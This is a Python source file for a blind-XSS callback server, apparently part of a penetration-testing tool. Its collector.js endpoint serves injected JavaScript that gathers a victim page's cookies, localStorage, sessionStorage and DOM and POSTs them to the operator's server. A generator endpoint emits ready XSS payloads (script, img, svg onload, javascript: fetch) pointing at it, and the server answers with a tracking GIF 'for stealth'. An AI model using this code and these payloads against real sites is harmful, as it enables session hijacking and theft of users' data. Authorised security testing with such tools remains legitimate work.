#!/usr/bin/env python3

"""
Project: BRS-XSS Blind XSS Callback Server
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Wed 25 Dec 2025 12:30:00 UTC
Status: Created
Telegram: https://t.me/EasyProTech

FastAPI-based Blind XSS callback server.
Receives and stores XSS callbacks with full evidence collection.
"""

import base64
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, Request, HTTPException, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse

from .models import CallbackCreate, PayloadInfo, ServerConfig
from .storage import CallbackStorage
from .notifications import NotificationManager


class BlindXSSServer:
    """Blind XSS callback server"""

    def __init__(self, config: Optional[ServerConfig] = None):
        self.config = config or ServerConfig()
        self.storage = CallbackStorage(self.config.database_path)
        self.notifications = NotificationManager(self.config.webhook)

        # Ensure directories exist
        Path(self.config.screenshots_dir).mkdir(parents=True, exist_ok=True)

        # Create FastAPI app
        self.app = self._create_app()

    def _create_app(self) -> FastAPI:
        """Create and configure FastAPI application"""
        app = FastAPI(
            title="BRS-XSS Blind XSS Server",
            description="Callback server for Blind XSS detection",
            version="3.0.0",
        )

        # CORS
        app.add_middleware(
            CORSMiddleware,
            allow_origins=self.config.cors_origins,
            allow_credentials=True,
            allow_methods=["*"],
            allow_headers=["*"],
        )

        # Routes
        self._register_routes(app)

        return app

    def _register_routes(self, app: FastAPI):
        """Register API routes"""

        # ============ Callback Endpoints ============

        @app.get("/", response_class=HTMLResponse)
        async def callback_get(
            request: Request,
            id: Optional[str] = Query(None, description="Payload ID"),
            context: Optional[str] = Query(None),
            background_tasks: BackgroundTasks = None,
        ):
            """
            GET callback endpoint - triggered by image/script tags.
            Minimal response for stealth.
            """
            payload_id = id or str(uuid.uuid4())[:12]

            # Store callback
            callback_id = self.storage.store_callback(
                payload_id=payload_id,
                source_ip=request.client.host if request.client else "unknown",
                user_agent=request.headers.get("user-agent", ""),
                referer=request.headers.get("referer"),
                url=str(request.url),
            )

            # Send notification in background
            if background_tasks:
                callback = self.storage.get_callback(callback_id)
                if callback:
                    background_tasks.add_task(
                        self.notifications.notify_callback, callback
                    )

            # Return minimal response (1x1 transparent GIF)
            gif_bytes = base64.b64decode(
                "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
            )
            return HTMLResponse(content=gif_bytes, media_type="image/gif")

        @app.post("/callback")
        async def callback_post(
            request: Request, data: CallbackCreate, background_tasks: BackgroundTasks
        ):
            """
            POST callback endpoint - receives full evidence data.
            Called by collector script injected via XSS.
            """
            # Handle screenshot if present
            screenshot_path = None
            if data.screenshot:
                try:
                    screenshot_data = base64.b64decode(data.screenshot)
                    if len(screenshot_data) <= self.config.max_screenshot_size:
                        screenshot_path = self._save_screenshot(
                            data.payload_id, screenshot_data
                        )
                except Exception:
                    pass

            # Truncate DOM snapshot if too large
            dom_snapshot = data.dom_snapshot
            if dom_snapshot and len(dom_snapshot) > self.config.max_dom_snapshot_size:
                dom_snapshot = (
                    dom_snapshot[: self.config.max_dom_snapshot_size] + "...[truncated]"
                )

            # Store callback
            callback_id = self.storage.store_callback(
                payload_id=data.payload_id,
                source_ip=request.client.host if request.client else "unknown",
                user_agent=data.user_agent or request.headers.get("user-agent", ""),
                referer=data.referrer,
                url=data.url,
                cookies=data.cookies,
                local_storage=data.local_storage,
                session_storage=data.session_storage,
                dom_snapshot=dom_snapshot,
                screenshot_path=screenshot_path,
                custom_data=data.custom_data,
            )

            # Send notification
            callback = self.storage.get_callback(callback_id)
            if callback:
                background_tasks.add_task(self.notifications.notify_callback, callback)

            return {"status": "ok", "callback_id": callback_id}

        @app.get("/collector.js", response_class=HTMLResponse)
        async def collector_script(
            id: str = Query(..., description="Payload ID"),
            server: Optional[str] = Query(None, description="Callback server URL"),
        ):
            """
            Returns JavaScript collector that gathers evidence and sends callback.
            Inject via: <script src="http://server/collector.js?id=xxx"></script>
            """
            callback_url = (
                server or f"http://{self.config.host}:{self.config.port}/callback"
            )

            script = f"""
(function() {{
    var data = {{
        payload_id: "{id}",
        url: window.location.href,
        referrer: document.referrer,
        cookies: document.cookie,
        user_agent: navigator.userAgent,
        local_storage: null,
        session_storage: null,
        dom_snapshot: null,
        screenshot: null,
        custom_data: {{
            title: document.title,
            origin: window.location.origin,
            pathname: window.location.pathname,
            timestamp: new Date().toISOString()
        }}
    }};

    // Collect localStorage
    try {{
        data.local_storage = JSON.stringify(localStorage);
    }} catch(e) {{}}

    // Collect sessionStorage
    try {{
        data.session_storage = JSON.stringify(sessionStorage);
    }} catch(e) {{}}

    // Collect DOM snapshot (limited)
    try {{
        data.dom_snapshot = document.documentElement.outerHTML.substring(0, 100000);
    }} catch(e) {{}}

    // Send data
    fetch("{callback_url}", {{
        method: "POST",
        headers: {{"Content-Type": "application/json"}},
        body: JSON.stringify(data),
        mode: "no-cors"
    }}).catch(function() {{}});
}})();
"""
            return HTMLResponse(content=script, media_type="application/javascript")

        # ============ Payload Management ============

        @app.post("/payloads")
        async def register_payload(payload: PayloadInfo):
            """Register a new payload for tracking"""
            payload_id = self.storage.register_payload(payload)
            return {"payload_id": payload_id}

        @app.get("/payloads/{payload_id}")
        async def get_payload(payload_id: str):
            """Get payload info"""
            payload = self.storage.get_payload(payload_id)
            if not payload:
                raise HTTPException(status_code=404, detail="Payload not found")
            return payload

        @app.get("/payloads/{payload_id}/callbacks")
        async def get_payload_callbacks(payload_id: str):
            """Get all callbacks for a payload"""
            callbacks = self.storage.get_callbacks_by_payload(payload_id)
            return {"payload_id": payload_id, "callbacks": callbacks}

        # ============ Callback Viewing ============

        @app.get("/callbacks")
        async def list_callbacks(limit: int = Query(50, le=100)):
            """List recent callbacks"""
            callbacks = self.storage.get_recent_callbacks(limit)
            return {"callbacks": callbacks}

        @app.get("/callbacks/{callback_id}")
        async def get_callback(callback_id: int):
            """Get specific callback"""
            callback = self.storage.get_callback(callback_id)
            if not callback:
                raise HTTPException(status_code=404, detail="Callback not found")
            return callback

        # ============ Statistics ============

        @app.get("/stats")
        async def get_stats():
            """Get callback statistics"""
            return self.storage.get_stats()

        # ============ Admin ============

        @app.post("/admin/cleanup")
        async def cleanup_old(retention_days: int = Query(30)):
            """Clean up old callbacks"""
            deleted = self.storage.cleanup_old_callbacks(retention_days)
            return {"deleted": deleted}

        @app.get("/health")
        async def health_check():
            """Health check endpoint"""
            return {"status": "healthy", "timestamp": datetime.utcnow().isoformat()}

        # ============ Payload Generator ============

        @app.get("/generate")
        async def generate_payloads(
            target: str = Query(..., description="Target URL"),
            param: str = Query(..., description="Parameter name"),
            context: str = Query("html", description="Context type"),
        ):
            """Generate Blind XSS payloads for a target"""
            payload_id = str(uuid.uuid4())[:12]
            base_url = f"http://{self.config.host}:{self.config.port}"

            # Register payload
            self.storage.register_payload(
                PayloadInfo(
                    payload_id=payload_id,
                    payload="[generated]",
                    target_url=target,
                    parameter=param,
                    context_type=context,
                )
            )

            payloads = [
                f'<script src="{base_url}/collector.js?id={payload_id}"></script>',
                f'<img src="{base_url}/?id={payload_id}">',
                f'"><script src="{base_url}/collector.js?id={payload_id}"></script>',
                f"'><script src='{base_url}/collector.js?id={payload_id}'></script>",
                f"<svg onload=\"var s=document.createElement('script');s.src='{base_url}/collector.js?id={payload_id}';document.body.appendChild(s)\">",
                f'javascript:fetch("{base_url}/?id={payload_id}")',
            ]

            return {
                "payload_id": payload_id,
                "target": target,
                "parameter": param,
                "context": context,
                "payloads": payloads,
            }

    def _save_screenshot(self, payload_id: str, data: bytes) -> str:
        """Save screenshot to disk"""
        filename = f"{payload_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
        path = Path(self.config.screenshots_dir) / filename
        path.write_bytes(data)
        return str(path)

    def run(self, host: Optional[str] = None, port: Optional[int] = None):
        """Run the server"""
        import uvicorn

        uvicorn.run(
            self.app, host=host or self.config.host, port=port or self.config.port
        )


def create_app(config: Optional[ServerConfig] = None) -> FastAPI:
    """Factory function for creating the app (for uvicorn)"""
    server = BlindXSSServer(config)
    return server.app
